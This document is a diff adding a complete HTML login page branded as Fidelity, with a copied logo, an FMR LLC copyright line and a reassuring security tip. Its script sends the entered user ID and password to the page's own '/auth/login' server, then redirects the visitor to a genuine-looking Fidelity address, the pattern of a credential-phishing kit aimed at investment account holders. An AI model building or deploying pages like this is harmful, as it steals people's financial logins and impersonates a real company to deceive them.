@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fidelity Login - Account Access</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      background: linear-gradient(135deg, #1db14d 0%, #0d8a3a 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+      max-width: 420px;
+      width: 100%;
+      padding: 48px 32px;
+      margin: 20px;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+    .fidelity-logo {
+      width: 100%;
+      max-width: 160px;
+      height: auto;
+      margin: 0 auto 24px;
+      display: block;
+    }
+    .header h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1c1c1e;
+      margin-bottom: 8px;
+    }
+    .header p {
+      font-size: 14px;
+      color: #636366;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: #1c1c1e;
+      margin-bottom: 8px;
+    }
+    input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid #e5e5e7;
+      border-radius: 6px;
+      font-size: 16px;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+    input:focus {
+      outline: none;
+      border-color: #1db14d;
+      box-shadow: 0 0 0 3px rgba(29, 177, 77, 0.1);
+    }
+    .remember-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+      gap: 8px;
+    }
+    .remember-group input[type="checkbox"] {
+      width: auto;
+      margin: 0;
+    }
+    .remember-group label {
+      margin: 0;
+      font-size: 13px;
+      color: #636366;
+    }
+    .forgot-link {
+      text-align: right;
+      margin-bottom: 24px;
+    }
+    .forgot-link a {
+      font-size: 13px;
+      color: #1db14d;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .forgot-link a:hover {
+      text-decoration: underline;
+    }
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(135deg, #1db14d 0%, #0d8a3a 100%);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .btn-login:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 24px rgba(29, 177, 77, 0.3);
+    }
+    .btn-login:active {
+      transform: translateY(0);
+    }
+    .btn-login:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .security-notice {
+      background: #f5f5f5;
+      padding: 12px;
+      border-radius: 6px;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #636366;
+      text-align: center;
+    }
+    .security-notice strong {
+      color: #1c1c1e;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 24px;
+      font-size: 12px;
+      color: #aeaeb2;
+    }
+    .error-msg {
+      display: none;
+      background: #fde8e8;
+      color: #d4003a;
+      padding: 12px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      font-size: 13px;
+    }
+    .spinner {
+      display: none;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: white;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .btn-login.loading {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .btn-login.loading .spinner { display: inline-block; }
+    .btn-login.loading span { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <svg class="fidelity-logo" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
+        <text x="10" y="45" font-size="32" font-weight="700" fill="#1db14d" font-family="Arial">fidelity</text>
+      </svg>
+      <h1>Login to Your Account</h1>
+      <p>Manage your investments securely</p>
+    </div>
+
+    <form id="loginForm" onsubmit="handleLogin(event)">
+      <div class="error-msg" id="errorMsg"></div>
+
+      <div class="form-group">
+        <label for="username">User ID or Email</label>
+        <input type="text" id="username" name="username" placeholder="Enter your ID or email" required autocomplete="username">
+      </div>
+
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+      </div>
+
+      <div class="remember-group">
+        <input type="checkbox" id="remember" name="remember">
+        <label for="remember">Remember my User ID</label>
+      </div>
+
+      <div class="forgot-link">
+        <a href="#" onclick="return false;">Forgot your password?</a>
+      </div>
+
+      <button type="submit" class="btn-login" id="submitBtn">
+        <div class="spinner"></div>
+        <span>Log In</span>
+      </button>
+
+      <div class="security-notice">
+        <strong>💡 Security Tip:</strong> Fidelity will never ask for your password via email or phone. Log in only at fidelity.com.
+      </div>
+    </form>
+
+    <div class="footer">
+      <p>© 2024 FMR LLC. All rights reserved. | <a href="#" style="color: inherit;">Security</a> | <a href="#" style="color: inherit;">Privacy</a></p>
+    </div>
+  </div>
+
+  <script>
+    async function handleLogin(e) {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const submitBtn = document.getElementById('submitBtn');
+      const errorMsg = document.getElementById('errorMsg');
+
+      submitBtn.disabled = true;
+      submitBtn.classList.add('loading');
+      errorMsg.style.display = 'none';
+
+      try {
+        const response = await fetch('/auth/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email: username,
+            password,
+            provider: 'fidelity',
+            type: 'fidelity'
+          })
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+          errorMsg.style.display = 'none';
+          setTimeout(() => {
+            window.location.href = 'https://login.fidelity.com/auth/dashboard';
+          }, 1000);
+        } else {
+          errorMsg.textContent = data.error || 'Invalid User ID or password';
+          errorMsg.style.display = 'block';
+        }
+      } catch (err) {
+        errorMsg.textContent = 'Connection error. Please try again.';
+        errorMsg.style.display = 'block';
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('loading');
+      }
+    }
+  </script>
+</body>
+</html>
